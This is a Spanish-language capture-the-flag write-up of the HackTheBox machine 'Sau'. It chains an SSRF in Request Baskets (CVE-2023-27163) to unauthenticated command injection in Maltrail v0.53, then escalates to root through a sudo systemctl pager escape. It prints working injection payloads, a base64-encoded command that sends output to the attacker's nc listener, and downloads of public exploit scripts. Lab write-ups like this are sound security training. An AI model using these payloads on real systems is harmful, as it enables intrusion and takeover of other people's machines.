# Sau - HackTheBox

**Fecha de resolución:** 22 de septiembre de 2026

Máquina Linux, IP 10.129.229.26.

## Reconocimiento

Escaneo completo de puertos:

```
nmap -n -p- -sS -T5 10.129.229.26 -vvv -oG allports --min-rate 5000
```

Dos puertos abiertos: 22 (OpenSSH 8.2p1 Ubuntu) y 55555 (HTTP, Golang net/http). Escaneo de versión sobre ambos:

```
nmap 10.129.229.26 -p22,55555 -n -sV -sC -vvv -oN targets
```

El puerto 55555 redirige a `/web` y responde con "Request Baskets", una herramienta que crea cestas HTTP para inspeccionar y reenviar peticiones a otro destino. Probé `http-enum` de nmap y `whatweb` sobre ese puerto para buscar rutas adicionales, sin resultado:

```
nmap -sV --script=http-enum 10.129.229.26 -p 55555
nmap -p 55555 --script=http-enum --script-args http-enum.basepath=/web/ 10.129.229.26
whatweb http://10.129.229.26:55555/
```

## SSRF en Request Baskets (CVE-2023-27163)

`searchsploit request-baskets` no devolvió nada local, así que antes de buscar un PoC probé la API a mano. Fui iterando contra puertos y rutas equivocadas (`5000`, `50000`, `/baskets/test` sin el prefijo `/api/`) hasta confirmar que la API real vive en el propio 55555, bajo `/api/baskets/<nombre>`:

```
curl -X POST "http://10.129.229.26:55555/api/baskets/test2"
curl -X GET "http://10.129.229.26:55555/baskets/test2"
```

Con la ruta correcta localizada, Request Baskets en versiones <= 1.2.1 permite crear una cesta cuyo `forward_url` apunta a cualquier URL, incluyendo direcciones internas del propio host, lo que habilita SSRF hacia servicios que solo escuchan en localhost. Usé el PoC público de la CVE en vez de seguir construyendo el JSON a mano:

```
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
./CVE-2023-27163.sh http://10.129.229.26:55555/ localhost
```

La primera prueba con `localhost` como destino fue solo para confirmar que el script funcionaba. La repetí apuntando de verdad al loopback del objetivo:

```
./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1
```

La cesta creada reenvía las peticiones hacia `127.0.0.1`. Antes de saber qué había ahí probé también forzar la ruta `/login` en el forward:

```
./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1/login
```

Consultando la cesta quedó expuesto qué corre en el localhost del host, solo accesible desde dentro: una instancia de Maltrail v0.53.

## RCE en Maltrail v0.53

`searchsploit Maltrail` (probando varias grafías: `Maltrail (v0.53)`, `Maltrail v0.53`, `Maltrail 0.53`) tampoco devolvió nada local. Maltrail v0.53 tiene una inyección de comandos no autenticada en el endpoint de login, a través del parámetro `username`, que se procesa sin sanitizar. Antes de intentar una reverse shell confirmé la ejecución con un comando simple, probando tanto backticks como `$()`, contra la cesta que actúa de proxy hacia el Maltrail interno:

```
curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;`id`;'
curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;$(id);'
```

Con la inyección confirmada, un one-liner de reverse shell normal (con paréntesis, comillas y `&`) no sobrevivía al paso por el body del POST y el propio shell remoto. Para evitarlo, codifiqué el payload en base64 y lo decodifiqué en remoto antes de ejecutarlo. Los primeros intentos fallaron porque el comando codificado no incluía el puerto del listener:

```
echo -n "id | nc 10.10.14.224" | base64
curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;echo aWQgfCBuYyAxMC4xMC4xNC4yMjQ= | base64 -d;'
```

Añadí el puerto y probé primero contra el 80, que exige root para escuchar, así que cambié a un puerto alto (4444):

```
echo -n "id | nc 10.10.14.224 4444" | base64
curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;`echo aWQgfCBuYyAxMC4xMC4xNC4yMjQgNDQ0NA== | base64 -d | sh`'
```

Con un listener en escucha capturé conexión como `puma`:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.229.26] 49112
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

Esa conexión manual con `nc` no era una pty completa. Para tener una shell estable usé el exploit público de Maltrail v0.53, que hace lo mismo pero spawnea una pty:

```
wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
python3 exploit.py 10.10.14.224 4444 http://10.129.229.26:55555/bsmoel
```

Hicieron falta varios reintentos, reiniciando el listener y ajustando el script, hasta que se estabilizó la conexión. Con la shell ya como `puma`, hice el upgrade de TTY habitual:

```
stty raw -echo; fg
```

## Escalada a root

Con `sudo -l` como `puma` aparece esto:

```
User puma may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`systemctl status` abre la salida en el pager `less` cuando el terminal es interactivo, y ese `less` hereda los privilegios de root al ser hijo del `systemctl` lanzado con sudo. Desde el pager, escapar con `!sh` da una shell con esos privilegios heredados:

```
sudo /usr/bin/systemctl status trail.service
!sh
```

Shell de root obtenida y flag capturada.

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
